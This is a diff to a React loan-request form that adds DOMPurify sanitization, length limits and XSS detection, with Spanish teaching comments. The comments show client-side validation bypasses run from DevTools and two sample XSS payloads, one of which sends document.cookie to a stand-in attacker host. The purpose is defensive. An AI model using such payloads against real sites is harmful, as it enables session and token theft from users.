@@ -1,5 +1,6 @@
 import { useState, useEffect } from 'react'
 import { apiFetch } from '../utils/api'
+import { sanitize, validateLength, FIELD_LIMITS } from '../utils/security'
 import PrivacyModal from './PrivacyModal'
 import './inventory.css'
 
@@ -27,6 +28,7 @@ export default function LoanRequestForm() {
     }
     loadAssets()
   }, [])
+
   const [selected, setSelected] = useState({})
   const [eventName, setEventName] = useState('')
   const [date, setDate] = useState('')
@@ -39,10 +41,37 @@ export default function LoanRequestForm() {
     setSelected((s) => ({ ...s, [id]: !s[id] }))
   }
 
+  // ═══════════════════════════════════════════════════════════════════
+  // SEGURIDAD — "Desmitificar la Seguridad del FrontEnd"
+  // ═══════════════════════════════════════════════════════════════════
+  // Esta validación es el PRIMER filtro. Un usuario con conocimientos
+  // técnicos puede bypassearla desde F12 > Console:
+  //
+  //   Ejemplo de bypass (eliminar restricción de longitud):
+  //   document.querySelector('input[maxlength]')
+  //     .removeAttribute('maxlength')
+  //
+  //   Ejemplo de bypass (ejecutar submit directamente):
+  //   document.querySelector('form').dispatchEvent(
+  //     new Event('submit', {bubbles:true, cancelable:true})
+  //   )
+  //
+  // El BACKEND (Node.js/Express) valida de forma independiente y
+  // rechazará datos inválidos aunque el frontend sea manipulado.
   function validate() {
     const e = {}
     if (!eventName.trim()) e.eventName = 'El nombre del evento es obligatorio'
     if (!date) e.date = 'La fecha es obligatoria'
+
+    // Validación de longitud máxima (bypasseable desde DevTools)
+    const lenError = validateLength(eventName, 'eventName')
+    if (lenError) e.eventName = lenError
+
+    // Detección de contenido XSS antes de enviar
+    if (eventName !== sanitize(eventName)) {
+      e.eventName = '⚠️ Se detectó contenido potencialmente peligroso (XSS)'
+    }
+
     if (assets.length === 0) {
       e.assets = 'No hay activos disponibles en el inventario'
     } else if (Object.values(selected).every((v) => !v)) {
@@ -57,23 +86,33 @@ export default function LoanRequestForm() {
     if (!validate()) return
 
     const chosen = assets.filter((a) => selected[a.id])
-    const comentarios = `Evento: ${eventName.trim()} - Fecha: ${date} - Periodo: ${period}`
+
+    // ═══════════════════════════════════════════════════════════════
+    // PRUEBA XSS — Sanitización de inputs con DOMPurify
+    // ═══════════════════════════════════════════════════════════════
+    // Antes de enviar al backend, sanitizamos el nombre del evento.
+    // Ejemplo de payload XSS que sería bloqueado:
+    //   Input:  <script>fetch('https://attacker.com?c='+document.cookie)</script>
+    //   Output: "" (DOMPurify elimina el tag script completamente)
+    //
+    //   Input:  <img src=x onerror="alert(localStorage.getItem('mg_token'))">
+    //   Output: <img src="x"> (DOMPurify elimina el atributo onerror)
+    const safeEventName = sanitize(eventName.trim())
+    const safeComentarios = `Evento: ${safeEventName} - Fecha: ${date} - Periodo: ${period}`
 
     try {
-      // API expects one request per asset, so we map and Promise.all
       await Promise.all(
         chosen.map((c) =>
           apiFetch('/solicitudes', {
             method: 'POST',
             body: JSON.stringify({
               activoId: c.id,
-              comentarios,
+              comentarios: safeComentarios,
             }),
           })
         )
       )
 
-      // reset
       setSelected({})
       setEventName('')
       setDate('')
@@ -81,7 +120,6 @@ export default function LoanRequestForm() {
       setErrors({})
       setSuccessMsg('Solicitud enviada correctamente. Está pendiente de aprobación.')
 
-      // Refresh available assets list
       const res = await apiFetch('/activos')
       const available = (res.data || []).filter(
         (a) => (a.estado || a.activo_estado) === 'Disponible'
@@ -118,7 +156,18 @@ export default function LoanRequestForm() {
             Nombre del evento{' '}
             {errors.eventName && <span className="error-text">{errors.eventName}</span>}
           </label>
-          <input value={eventName} onChange={(e) => setEventName(e.target.value)} />
+          {/* maxLength: primer filtro (bypasseable desde F12).
+              DOMPurify en handleSubmit: segundo filtro.
+              Backend: tercer y definitivo filtro. */}
+          <input
+            value={eventName}
+            maxLength={FIELD_LIMITS.eventName}
+            onChange={(e) => setEventName(e.target.value)}
+            placeholder="Ej: Concierto de Fin de Año"
+          />
+          <small style={{ color: 'var(--text-muted)', fontSize: '0.75rem' }}>
+            {eventName.length}/{FIELD_LIMITS.eventName} caracteres
+          </small>
         </div>
 
         <div className="form-group">
